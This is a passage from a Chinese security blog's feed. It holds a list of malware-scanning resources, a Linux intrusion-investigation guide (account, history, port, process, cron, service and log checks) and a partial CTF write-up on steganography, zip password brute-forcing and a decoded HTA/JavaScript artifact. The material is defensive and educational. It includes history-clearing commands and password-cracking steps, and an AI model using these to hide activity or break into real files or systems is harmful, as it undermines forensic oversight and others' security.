href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区： <a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛： <a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区： <a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><h2 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h2><p>多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎: <a href="http://www.virscan.org/">http://www.virscan.org</a></p><p>腾讯哈勃分析系统: <a href="https://habo.qq.com/">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统: <a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p><p>针对计算机病毒、手机病毒、可疑文件等进行检测分析: <a href="http://www.scanvir.com/">http://www.scanvir.com</a></p><h2 id="webshell-查杀"><a href="#webshell-查杀" class="headerlink" title="webshell 查杀"></a>webshell 查杀</h2><p>D盾_Web查杀： <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 webshell 查杀： <a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p>深信服 Webshell 网站后门检测工具： <a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3： <a href="http://www.uusec.com/webshell.zip">http://www.uusec.com/webshell.zip</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;当企业发生黑客入侵、系统崩溃或其他影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短的时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。&lt;/p&gt;
&lt;/bloc</summary>
      
    
    
    
    
    <category term="Blue_Team" scheme="http://www.beigui.xyz/tags/Blue-Team/"/>
    
  </entry>
  
  <entry>
    <title>linux应急响应入侵排查</title>
    <link href="http://www.beigui.xyz/2022/06/15/linux-blue-Team/"/>
    <id>http://www.beigui.xyz/2022/06/15/linux-blue-Team/</id>
    <published>2022-06-15T00:14:33.000Z</published>
    <updated>2023-03-12T12:59:28.703Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p></blockquote><blockquote><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p></blockquote><p><a href="https://blog.csdn.net/jihaichen/article/details/86756008">文章来源</a></p><h1 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h1><h2 id="一、账号安全"><a href="#一、账号安全" class="headerlink" title="一、账号安全"></a>一、账号安全</h2><h3 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h3><p><strong>1、用户信息文件 &#x2F;etc&#x2F;passwd</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x\:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br></pre></td></tr></table></figure><p>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</p><p>注意：无密码只允许本机登陆，远程不允许登陆</p><p><strong>2、影子文件 &#x2F;etc&#x2F;shadow</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: </span><br><span class="line">//用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><p><strong>3、几个常用命令：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span>      //查看当前登录用户（<span class="built_in">tty</span> 本地登陆 pts 远程登录）</span><br><span class="line">w        //查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"><span class="built_in">uptime</span>   //查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><h3 id="入侵排查："><a href="#入侵排查：" class="headerlink" title="入侵排查："></a>入侵排查：</h3><p><strong>1、查询特权用户(特权用户uid 为 0)</strong></p><p>查看<code>/etc/passwd</code>中UID为0的账户。</p><p><strong>2、查询可以远程登录的帐号信息</strong></p><p>无密码不能远程登陆。打开<code>/etc/shadow</code>中查看有加密密码的用户进行判断。(配合<code>who</code>、<code>uptime</code>进行判断哪些正在被远程)</p><p><strong>3、禁用或删除多余及可疑的帐号</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usermod -L user   //禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">userdel user      //删除 user 用户</span><br><span class="line">userdel -r user   //将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h2 id="二、历史命令"><a href="#二、历史命令" class="headerlink" title="二、历史命令"></a>二、历史命令</h2><h3 id="基本使用：-1"><a href="#基本使用：-1" class="headerlink" title="基本使用："></a>基本使用：</h3><blockquote><p>通过 .bash_history 查看帐号执行过的系统命令</p></blockquote><p><strong>1、root 的历史命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure><p><strong>2、历史操作命令的清除：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure><p>ps:但此命令并不会清除保存在文件中的记录，因此需要手动删除 <code>/用户名/.bash_profile</code> 文件中的记录。</p><h3 id="入侵排查：-1"><a href="#入侵排查：-1" class="headerlink" title="入侵排查："></a>入侵排查：</h3><p>进入用户目录下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .bash_history &gt;&gt; history.txt  //在用户根目录下导出history.txt</span><br></pre></td></tr></table></figure><h2 id="三、端口"><a href="#三、端口" class="headerlink" title="三、端口"></a>三、端口</h2><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p>ps:在linux上没有netstat命令时，使用<code>yum install net-tools</code>安装。</p><p>运行 ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的 pid 号）</p><h2 id="四、进程"><a href="#四、进程" class="headerlink" title="四、进程"></a>四、进程</h2><p>使用 ps 命令，分析进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid     //输入想查看的pid数字</span><br></pre></td></tr></table></figure><p>ps：也可以使用top查看高使用率的进程进行分析。</p><h2 id="五、开机启动项"><a href="#五、开机启动项" class="headerlink" title="五、开机启动项"></a>五、开机启动项</h2><h3 id="基本使用：-2"><a href="#基本使用：-2" class="headerlink" title="基本使用："></a>基本使用：</h3><p>系统运行级别示意图：</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/2.png" alt="img"></p><p>查看运行级别命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure><p>系统默认允许级别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/inittab <span class="built_in">id</span>=3：initdefault   //系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local </span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 &#x2F;etc&#x2F;init.d 目录下，然后在 &#x2F;etc&#x2F;rc.d&#x2F;rc*.d 中建立软链接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span></span><br></pre></td></tr></table></figure><p>此处 <code>sshd</code> 是具体服务的脚本文件，<code>S100ssh</code> 是其软链接，<code>S</code> 开头代表加载时自启动；如果是 <code>K</code> 开头的脚本文件，代表运行级别加载时需要关闭的。</p><h3 id="入侵排查：-2"><a href="#入侵排查：-2" class="headerlink" title="入侵排查："></a>入侵排查：</h3><p>启动项文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local /etc/rc.d/rc[0~6].d <span class="built_in">ls</span> -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure><p>查看是否存在脚本的软链接。</p><h2 id="六、定时任务"><a href="#六、定时任务" class="headerlink" title="六、定时任务"></a>六、定时任务</h2><h3 id="基本使用：-3"><a href="#基本使用：-3" class="headerlink" title="基本使用："></a>基本使用：</h3><p><strong>1、利用 crontab 创建计划任务</strong></p><p>crontab -l 列出某个用户 cron 服务的详细内容</p><blockquote><p>Tips：默认编写的 crontab 文件会保存在 ( &#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root）</p></blockquote><p>crontab -r 删除每个用户 cront 任务<code>(谨慎：删除所有的计划任务)</code></p><p>crontab -e 使用编辑器编辑当前的 crontab 文件</p><p>如：*&#x2F;1 * * * * echo “hello world” &gt;&gt; &#x2F;tmp&#x2F;test.txt 每分钟写入文件</p><p>格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*    *    *    *    *</span><br><span class="line">-    -    -    -    -</span><br><span class="line">|    |    |    |    |</span><br><span class="line">|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)</span><br><span class="line">|    |    |    +---------- 月份 (1 - 12) </span><br><span class="line">|    |    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +-------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------- 分钟 (0 - 59)</span><br></pre></td></tr></table></figure><p><strong>2、利用 anacron 实现异步定时任务调度</strong></p><p>每天运行 &#x2F;home&#x2F;backup.sh 脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</span><br></pre></td></tr></table></figure><p>当机器在 backup.sh 期望被运行时是关机的，anacron 会在机器开机十分钟之后运行它，而不用再等待 7 天。</p><p>解释：<br>anacron 如何在 Linux 工作？</p><p>anacron 任务被列在 <code>/etc/anacrontab</code> 中，任务可以使用下面的格式(anacron 文件中的注释必须以 <code>#</code> 号开始)安排。</p><p>anacron 用于以天为单位的频率运行命令。它的工作与 cron 稍有不同，它假设机器不会一直开机。</p><p>anacron 会检查任务是否已经在 period(某一时间) 字段指定的时间被执行了。如果没有，则在等待 delay(延迟) 字段中指定的分钟数后，执行 command 字段中指定的命令。 一旦任务被执行了，它会使用 job-id(时间戳文件名)字段中指定的名称将日期记录在 &#x2F;var&#x2F;spool&#x2F;anacron 目录中的时间戳文件中。</p><h3 id="入侵排查：-3"><a href="#入侵排查：-3" class="headerlink" title="入侵排查："></a>入侵排查：</h3><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab </span><br><span class="line">/etc/cron.d/* </span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/* </span><br><span class="line">/etc/cron.weekly/ </span><br><span class="line">/etc/anacrontab </span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p><em>小技巧：</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more + 路径目录    //查看目录下所有文件</span><br></pre></td></tr></table></figure><h2 id="七、服务"><a href="#七、服务" class="headerlink" title="七、服务"></a>七、服务</h2><h3 id="服务自启动："><a href="#服务自启动：" class="headerlink" title="服务自启动："></a>服务自启动：</h3><p><strong>第一种修改方法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别][独立服务名][on|off]</span><br><span class="line">chkconfig –level 2345 httpd on 开启自启动</span><br><span class="line">chkconfig httpd on （默认 level 是 2345）</span><br></pre></td></tr></table></figure><p><strong>第二种修改方法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改 /etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure><p><strong>第三种修改方法：</strong></p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p>ps:如果没有ntsysv命令使用<code>yum install ntsysv</code>安装。</p><h3 id="入侵排查：-4"><a href="#入侵排查：-4" class="headerlink" title="入侵排查："></a>入侵排查：</h3><p><strong>1、查询已安装的服务：</strong></p><p><em>RPM 包安装的服务:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line"></span><br><span class="line">ps aux | grep <span class="string">&quot;服务名字&quot;</span> 查看当前服务（不加引号）</span><br></pre></td></tr></table></figure><p><em>系统在 3 与 5 级别下的启动项</em></p><p>中文环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list | grep <span class="string">&quot;3:启用|5:启用&quot;</span></span><br></pre></td></tr></table></figure><p>英文环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list | grep <span class="string">&quot;3:on|5:on&quot;</span></span><br></pre></td></tr></table></figure><p><em>源码包安装的服务</em></p><p>查看服务安装位置 ，一般是在 &#x2F;user&#x2F;local&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br></pre></td></tr></table></figure><p>搜索 &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 查看是否存在</p><h2 id="八、系统日志"><a href="#八、系统日志" class="headerlink" title="八、系统日志"></a>八、系统日志</h2><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/3.png" alt="img"></p><p><strong>主要日志文件介绍：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">内核及公共消息日志:/var/log/messages</span><br><span class="line">计划任务日志：/var/log/cron</span><br><span class="line">系统引导日志：/var/log/dmesg</span><br><span class="line">邮件系统日志:/var/log/maillog</span><br><span class="line">用户登录日志：/var/log/lastlog</span><br><span class="line">/var/log/boot.log（记录系统在引导过程中发生的时间）</span><br><span class="line">/var/log/secure (用户验证相关的安全性事件)</span><br><span class="line">/var/log/wtmp(当前登录用户详细信息)</span><br><span class="line">/var/log/btmp（记录失败的的记录）</span><br><span class="line">/var/run/utmp（用户登录、注销及系统开、关等事件）</span><br></pre></td></tr></table></figure><p><strong>日志文件详细介绍：</strong></p><p>1、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/secure        </span><br><span class="line">//Linux系统安全日志，记录用户和工作组的情况、用户登陆认证情况</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/4.png" alt="img"></p><p>可以看到这里有ssh的连接日志。</p><p>2、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/boot.log      </span><br><span class="line">//该文件记录了系统在引导过程中发生的事件</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/5.png" alt="img"></p><p>说实话，这个用处并不是很大。</p><p>3、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/messages</span><br><span class="line">//内核及公共信息日志，是许多进程日志文件的汇总，从该文件中可以看出任何***或成功的***</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/6.png" alt="img"></p><p>里面的内容很多，而且很杂，一般情况下我们用不到这个。</p><p>4、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/dmesg</span><br><span class="line">//系统引导日志</span><br></pre></td></tr></table></figure><p>该日志使用<code>dmesg</code>命令快速查看最后一次系统引导的引导日志<br>dmesg | more</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/7.png" alt="img"></p><p>5、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/lastlog</span><br><span class="line">//最近的用户登录事件，一般记录最后一次的登录事件</span><br></pre></td></tr></table></figure><p>ps:该日志不能用诸如cat、tail等查看，因为该日志里面是二进制文件，可以用<code>lastlog</code>命令查看，它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示 <code>Never logged</code>。</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/8.png" alt="img"></p><p>6、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp</span><br><span class="line">//该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。</span><br></pre></td></tr></table></figure><p>ps:该日志为二进制文件，不能用诸如tail&#x2F;cat&#x2F;等命令，使用last命令查看。</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/9.png" alt="img"></p><p>7、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/mailog</span><br><span class="line">//记录邮件的收发</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/10.png" alt="img"></p><p>8、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp</span><br><span class="line">//此文件是记录错误登录的日志，可以记录有人使用暴力破解ssh服务的日志。</span><br></pre></td></tr></table></figure><p>ps:该文件用lastb打开</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/11.png" alt="img"></p><p>9、</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/utmp</span><br><span class="line">//该日志记录当前用户登录的情况，不会永久保存记录。</span><br></pre></td></tr></table></figure><p>ps:可以用who&#x2F;w命令来查看</p><p><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/linux%E5%BA%94%E6%80%A5img/12.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    
    <category term="Blue_Team" scheme="http://www.beigui.xyz/tags/Blue-Team/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3迎新赛部分WP</title>
    <link href="http://www.beigui.xyz/2022/05/26/Dest0g3/"/>
    <id>http://www.beigui.xyz/2022/05/26/Dest0g3/</id>
    <published>2022-05-26T10:48:06.000Z</published>
    <updated>2022-09-17T09:16:49.496Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174928597.png" alt="image-20220527174928597"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking-DestCTF"><a href="#Welcome-to-fxxking-DestCTF" class="headerlink" title="Welcome to fxxking DestCTF"></a>Welcome to fxxking DestCTF</h3><p>签到题关注公众号回复：Give me the fxxking flag</p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>使用zsteg查看是否存在LSB隐写数据</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174306747.png" alt="image-20220527174306747"></p><p>可以看到存在一个ZIP文件，并且lsb信息当中写着压缩包密码，使用zsteg分离从图片中分离压缩包，使用密码解密得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e extradata:0 Dest0g3.png Dest0g3.png &gt;&gt; 1.zip</span><br></pre></td></tr></table></figure><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><p>下载得到一个有密码的压缩包，仔细检查过后没有发现关于密码的提示，使用ziperello爆破得到密码</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174359263.png" alt="image-20220527174359263"></p><p>打开压缩包当中的文件发现是 .和-推测为摩斯密码，对摩斯密码解密得到一串16进制字符串，对16进制转ASCII得到unicode字符再进行解码得到flag</p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><p>下载附件，打开后有三个文件一个是hint.txt,另一个是password.txt,第三个是一个有密码的压缩包，将password.txt打开后全部由空格和tab组成，这里有一个之前没有遇到的知识点就是<strong>空白字符编程</strong>，我们利用在线工具解出password后，在压缩包中提取到一张图片，用zsteg分析图片发现存在一个pyc文件，使用zsteg分离出来之后，运行得到flag</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174424912.png" alt="image-20220527174424912"></p><h3 id="你知道JS吗？"><a href="#你知道JS吗？" class="headerlink" title="你知道JS吗？"></a>你知道JS吗？</h3><p>下载得到一个无后缀文件，使用file命令查看文件类型，看到是一个word文档，修改后缀名后打开。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174434138.png" alt="image-20220527174434138"></p><p>打开word文档发现是一堆表情符号，修改字体得到base64字符，对字符进行解码，得到JS代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span><br><span class="line">&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;</span><br><span class="line">            &lt;requestedExecutionLevel level=&quot;asInvoker&quot; uiAccess=&quot;false&quot;/&gt;</span><br><span class="line">&lt;application xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;</span><br><span class="line">        &lt;dpiAwareness xmlns=&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;&gt;Do you know js&lt;/dpiAwareness&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;document.write(unescape(&#x27;&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Do You Know js&lt;/title&gt;</span><br><span class="line">&lt;HTA:APPLICATION</span><br><span class="line">  APPLICATIONNAME=&quot;Do You Know js&quot;</span><br><span class="line">  ID=&quot;Inception&quot;</span><br><span class="line">  VERSION=&quot;1.0&quot;</span><br><span class="line">  SCROLL=&quot;no&quot;/&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    &lt;div id=&quot;feature&quot;&gt;</span><br><span class="line">            &lt;div id=&quot;content</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">                &lt;h1 id=&quot;unavailable&quot; class=&quot;loading&quot;&gt;Building js.....&lt;/h1&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;</span><br><span class="line">function RunFile() &#123;</span><br><span class="line">          var WshShell = new ActiveXObject(&quot;WScript.Shell&quot;);</span><br><span class="line">WshShell.Run(&quot;notepad %windir%/Desktop/js.txt&quot;, 1, false);</span><br><span class="line">          /* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;Implant Inception Here&quot; onclick=&quot;RunFile();&quot;/&gt;</span><br><span class="line">&lt;p style=&quot;color:white;&quot;&gt;</span><br><span class="line"></span><br><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ 